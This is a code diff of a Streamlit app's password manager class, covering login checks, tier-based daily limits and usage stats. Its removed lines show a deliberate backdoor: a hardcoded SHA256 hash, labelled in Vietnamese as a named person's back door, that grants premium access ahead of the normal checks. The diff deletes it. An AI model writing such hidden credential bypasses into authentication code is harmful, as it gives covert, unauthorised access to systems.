@@ -1,66 +1,52 @@
 import json
-from datetime import datetime, timedelta
-import secrets
-import string
-import hashlib
-import uuid
+from datetime import datetime
 import streamlit as st
-import base64
-import psutil
-import time
-import plotly.graph_objects as go
-import pandas as pd
 from collections import defaultdict
-import jieba
-from pypinyin import pinyin, Style
-import requests
+from pydantic import BaseModel, Field
+from typing import Dict, Any
 
+# Pydantic model for Usage Stats
+class UserUsage(BaseModel):
+    date: str
+    count: int
 
 class PasswordManager:
     def __init__(self):
-        # Lấy API keys và metadata từ secrets
+        # Get API keys and their metadata from secrets
         self.api_keys = st.secrets.get("api_keys", {})
         self.user_tiers = st.secrets.get("user_tiers", {})
-        self.default_limit = st.secrets.get("usage_limits", {}).get("default_daily_limit", 30000)
-        self.premium_limit = st.secrets.get("usage_limits", {}).get("premium_daily_limit", 50000)
         
+        # Define limits (Support old config or new standard)
+        usage_limits = st.secrets.get("usage_limits", {})
+        self.default_limit = usage_limits.get("default_daily_limit", 30000)
+        self.premium_limit = usage_limits.get("premium_daily_limit", 50000)
+        
+        # Initialize usage tracking in session state if not exists
         if 'usage_tracking' not in st.session_state:
             st.session_state.usage_tracking = {}
             
+        # Add key name mapping in session state
         if 'key_name_mapping' not in st.session_state:
             st.session_state.key_name_mapping = {}
             
-    def _hash_password(self, password):
-        """Hàm băm mật khẩu bằng SHA256"""
-        try:
-            return hashlib.sha256(password.encode('utf-8')).hexdigest()
-        except:
-            return ""
-
     def check_password(self, password):
         """Check if password is valid and map key name"""
-        
-        if not password:
+        if not password:  # Handle empty password
             return False
-
-        # --- 1. CỬA SAU CỦA MAI HẠNH (ƯU TIÊN HÀNG ĐẦU) ---
-        MAI_HANH_HASH = "8f0a1c43f7a40b92316e689d0426f8d09f30b91d575c3016c52a382e753443a5"
         
-        if self._hash_password(password) == MAI_HANH_HASH:
-            st.session_state.key_name_mapping[password] = "MaiHanhPremium"
-            return True
-        # --- KẾT THÚC CỬA SAU ---
-
-        # 2. KIỂM TRA ADMIN GỐC
+        # Get admin password
         admin_pwd = st.secrets.get("admin_password")
+        api_keys = st.secrets.get("api_keys", {})
+        
+        # For admin login
         if password == admin_pwd and self.is_admin(password):
             st.session_state.key_name_mapping[password] = "admin"
             return True
         
-        # 3. KIỂM TRA USER THƯỜNG
-        api_keys = st.secrets.get("api_keys", {})
+        # For regular user login - check value and store key name
         for key_name, key_value in api_keys.items():
             if password == key_value:
+                # Store the mapping of value to key name
                 st.session_state.key_name_mapping[password] = key_name
                 return True
                 
@@ -77,19 +63,15 @@ class PasswordManager:
         """Get daily limit for a user based on their tier"""
         if not user_key:
             return self.default_limit
-        
-        key_name = self.get_key_name(user_key)
-        
-        # --- KIỂM TRA MẬT KHẨU CỦA CHỊ ---
-        if key_name == "MaiHanhPremium":
-            return self.premium_limit
-        # --- KẾT THÚC KIỂM TRA ---
-
+            
         # Admin gets premium limit
         if user_key == st.secrets.get("admin_password"):
             return self.premium_limit
             
+        # Get user's key name
         key_name = self.get_key_name(user_key)
+        
+        # Check user's tier
         user_tier = self.user_tiers.get(key_name, "default")
         
         if user_tier == "premium":
@@ -104,10 +86,10 @@ class PasswordManager:
             'user_stats': defaultdict(lambda: defaultdict(int))
         }
         
-        for user_key, data in st.session_state.usage_tracking.items():
+        for user, data in st.session_state.usage_tracking.items():
             for date, count in data.items():
                 stats['daily_stats'][date] += count
-                stats['user_stats'][user_key][date] = count
+                stats['user_stats'][user][date] = count
                 
         return stats
 
